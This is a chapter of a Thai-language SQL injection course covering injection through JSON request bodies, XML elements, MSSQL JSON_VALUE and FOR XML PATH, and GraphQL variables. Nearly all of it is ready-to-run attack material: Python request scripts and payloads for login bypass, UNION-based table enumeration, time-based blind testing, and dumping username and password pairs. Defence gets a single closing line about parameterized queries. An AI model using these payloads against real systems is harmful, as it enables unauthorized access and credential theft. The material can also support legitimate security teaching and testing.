# Part 048: SQL Injection ใน JSON และ XML Parsing

## ภาพรวม

การเป็น JSON และ XML แล้ว INSERT/UPDATE เข้า DB โดยไม่ sanitize

**ขั้นตอนที่ 761-780**

---

## 761. JSON Body Injection

```python
import requests
import json

# Target: POST /api/login {"username": "...", "password": "..."}
# Server code (vulnerable):
# query = f"SELECT * FROM users WHERE username='{data['username']}' AND password='{data['password']}'"

# Basic auth bypass
payload_1 = {
    "username": "admin' -- -",
    "password": "anything"
}

# UNION injection in JSON
payload_2 = {
    "username": "' UNION SELECT 1,'hacked',3-- -",
    "password": "x"
}

# Boolean blind via JSON
payload_3 = {
    "username": "admin' AND SLEEP(3)-- -",
    "password": "x"
}

for p in [payload_1, payload_2, payload_3]:
    r = requests.post('http://target/api/login',
                      json=p,
                      headers={'Content-Type': 'application/json'})
    print(f"Status: {r.status_code}, Time: {r.elapsed.total_seconds():.2f}s")
    print(f"Response: {r.text[:200]}\n")
```

---

## 762. JSON ใน MSSQL

```sql
-- MSSQL รองรับ JSON แบบ native (2016+)
SELECT name, email FROM users FOR JSON AUTO;

-- ถ้าใช้ JSON_VALUE() แล้ว concat:
DECLARE @json NVARCHAR(MAX) = '{"user": "admin\' OR 1=1--"}';
SELECT * FROM users WHERE username = JSON_VALUE(@json, '$.user');
-- JSON_VALUE ส่งค่าแบบ string, แต่ concat ยัง vulnerable

-- ถ้าถูก concat เข้า query string:
DECLARE @query NVARCHAR(500) = 'SELECT * FROM users WHERE username = ''' + JSON_VALUE(@json, '$.user') + '''';
EXEC(@query);
```

---

## 763. XML Parsing และ SQL Injection

```python
import requests

# XML body injection
xml_payload = """<?xml version="1.0" encoding="UTF-8"?>
<login>
  <username>' OR '1'='1</username>
  <password>test</password>
</login>"""

r = requests.post('http://target/api/login-xml',
                  data=xml_payload,
                  headers={'Content-Type': 'application/xml'})

# UNION via XML element
xml_union = """<?xml version="1.0"?>
<search>
  <keyword>' UNION SELECT table_name,NULL FROM information_schema.tables-- -</keyword>
</search>"""

r2 = requests.post('http://target/api/search-xml',
                   data=xml_union,
                   headers={'Content-Type': 'application/xml'})
```

---

## 764. MSSQL FOR XML Exfiltration

```sql
-- MSSQL: เอาข้อมูลออกมาเป็น XML string เดียว
' UNION SELECT (SELECT * FROM users FOR XML PATH(''))-- -

-- เอา multiple columns:
' UNION SELECT NULL,(SELECT username+'|'+password FROM users FOR XML PATH(''))-- -

-- หลีกเลี่ยงสปเซชัลอักขระ:
' UNION SELECT NULL,(SELECT username+CHAR(58)+password+CHAR(10) FROM users FOR XML PATH(''),TYPE).value('.','nvarchar(max)')-- -
```

---

## 765. GraphQL และ SQL Injection

```python
import requests

# GraphQL endpoint
url = 'http://target/graphql'

# Introspection query
introspection = {
    "query": """{ __schema { types { name fields { name } } } }"""
}

r = requests.post(url, json=introspection)
schema = r.json()

# Injection via GraphQL variable
injection_query = {
    "query": """query getUser($id: String!) {
        user(id: $id) {
            username
            email
        }
    }""",
    "variables": {
        "id": "1' UNION SELECT username,password FROM users-- -"
    }
}

r2 = requests.post(url, json=injection_query)
print(r2.json())

# Injection via query string directly
injection_direct = {
    "query": """{ user(id: \"1' UNION SELECT 1,table_name FROM information_schema.tables-- -\") { id name } }"""
}

r3 = requests.post(url, json=injection_direct)
```

---

## สรุป

JSON/XML/GraphQL + SQL Injection:
- **JSON body** - เหมือนส่ง GET param
- **XML elements** - เนื้อหา XML tag inject ได้
- **FOR XML PATH** - MSSQL exfiltration technique
- **GraphQL variables** - inject ผ่าน variables/args
- **Prevention** - ใช้ parameterized query เสมอไม่ว่า input format

---

*Part 048 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
